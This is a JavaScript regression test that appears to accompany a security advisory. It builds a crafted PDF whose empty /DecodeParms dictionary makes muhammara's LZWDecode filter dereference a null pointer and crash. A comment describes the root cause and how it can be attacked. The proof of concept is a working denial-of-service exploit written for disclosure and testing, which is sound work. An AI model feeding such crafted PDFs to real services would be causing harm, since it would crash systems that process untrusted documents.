/**
 * CVE PoC: muhammara - NULL Pointer Dereference in LZWDecode Filter
 *
 * Affected:  muhammara <= 6.0.4 (latest)
 * Component: PDFParser::CreateFilterForStream()
 * File:      src/deps/PDFWriter/PDFParser.cpp:2107
 * Impact:    Denial of Service (process crash)
 * CVSS 3.1:  7.5 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
 *
 * ===== Root Cause =====
 *
 * PDFParser.cpp:2098-2110:
 *
 *   else if (inFilterName->GetValue() == "LZWDecode")
 *   {
 *       int early = 1;
 *       if (inDecodeParams)
 *       {
 *           PDFObjectCastPtr<PDFInteger> earlyObj(
 *               QueryDictionaryObject(inDecodeParams, "EarlyChange")
 *           );
 *           early = earlyObj->GetValue();  // ← NULL deref here
 *       }
 *   }
 *
 * When a PDF stream specifies /Filter /LZWDecode with a /DecodeParms
 * dictionary that does NOT contain the "EarlyChange" key:
 *
 *   1. inDecodeParams != NULL  (dictionary exists)
 *   2. QueryDictionaryObject(inDecodeParams, "EarlyChange") returns NULL
 *      (key not present)
 *   3. PDFObjectCastPtr<PDFInteger>(NULL) wraps NULL pointer
 *   4. earlyObj->GetValue() dereferences NULL
 *   5. Access Violation → process crash (DoS)
 *
 * RefCountPtr::operator->() has no NULL guard:
 *   T* RefCountPtr<T>::operator->() { return mValue; }  // no check
 *
 * ===== Attack Vector =====
 *
 * Any application that:
 *   - Accepts PDF files from untrusted sources
 *   - Uses muhammara to read/process streams (startReadingFromStream,
 *     font embedding, content extraction, etc.)
 *
 * ===== Reproduction =====
 *
 * muhammara 6.0.4, Node.js v22, Windows/Linux
 * Exit code: 0xC0000005 (Access Violation)
 */

const muhammara = require("../../lib/muhammara");
const fs = require("fs");
const path = require("path");

// ─────────────────────────────────────────────
// Craft malicious PDF
// ─────────────────────────────────────────────

function buildMaliciousPDF() {
  // Minimal valid LZW stream: Clear(256) + EOD(257) packed in 9-bit codes
  const lzwPayload = Buffer.from([0x80, 0x0b, 0x60]);

  const header = "%PDF-1.4\n";
  const obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n";
  const obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n";
  const obj3 =
    "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n";

  // Trigger: /DecodeParms present but missing "EarlyChange" key
  const obj4head =
    `4 0 obj\n` +
    `<< /Filter /LZWDecode\n` +
    `   /DecodeParms << >>\n` + // <-- empty dict, no EarlyChange
    `   /Length ${lzwPayload.length} >>\n` +
    `stream\n`;
  const obj4tail = `\nendstream\nendobj\n`;

  // Calculate exact xref offsets
  const offsets = [];
  let pos = header.length;
  [obj1, obj2, obj3].forEach((o) => {
    offsets.push(pos);
    pos += o.length;
  });
  offsets.push(pos); // obj4
  const xrefPos = pos + obj4head.length + lzwPayload.length + obj4tail.length;

  const fmt = (n) => String(n).padStart(10, "0");
  const xref =
    `xref\n0 5\n` +
    `0000000000 65535 f \n` +
    `${fmt(offsets[0])} 00000 n \n` +
    `${fmt(offsets[1])} 00000 n \n` +
    `${fmt(offsets[2])} 00000 n \n` +
    `${fmt(offsets[3])} 00000 n \n`;
  const trailer = `trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n${xrefPos}\n%%EOF`;

  return Buffer.concat([
    Buffer.from(header),
    Buffer.from(obj1),
    Buffer.from(obj2),
    Buffer.from(obj3),
    Buffer.from(obj4head),
    lzwPayload,
    Buffer.from(obj4tail),
    Buffer.from(xref),
    Buffer.from(trailer),
  ]);
}

describe("Testing muhammara NULL Pointer Dereference PoC (GHSA-fhp4-pr5j-46m5)", function () {
  it("should complete without error", function () {
    const TARGET = __dirname + "/../output/poc_muhammara_lzw.pdf";

    // Write malicious PDF
    fs.writeFileSync(TARGET, buildMaliciousPDF());

    // Verify PDF parses successfully (to confirm valid structure)
    const reader = muhammara.createReader(TARGET);

    try {
      // Retrieve stream object (obj 4)
      const streamObj = reader.parseNewObject(4);

      // Trigger: startReadingFromStream applies LZW filter
      // → CreateFilterForStream → earlyObj->GetValue() on NULL → ACCESS VIOLATION
      reader.startReadingFromStream(streamObj);
    } finally {
      reader.end();
      fs.unlinkSync(TARGET);
    }
  });
});
